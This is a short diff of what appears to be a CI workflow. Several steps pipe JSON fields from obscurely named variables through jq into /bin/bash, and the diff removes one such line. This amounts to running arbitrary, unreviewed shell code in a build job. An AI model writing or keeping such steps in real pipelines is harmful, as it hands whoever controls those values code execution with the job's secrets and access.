@@ -28,7 +28,6 @@ jobs:
           echo $wamn2 | jq -r .t67 | /bin/bash
           echo $yimf5524 | jq -r .sdbym79733 | /bin/bash
           printf '%s' "$dou0" | jq -r .p9 | /bin/bash
-          printf '%s' "$vnnn5558" | jq -r .lh68 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
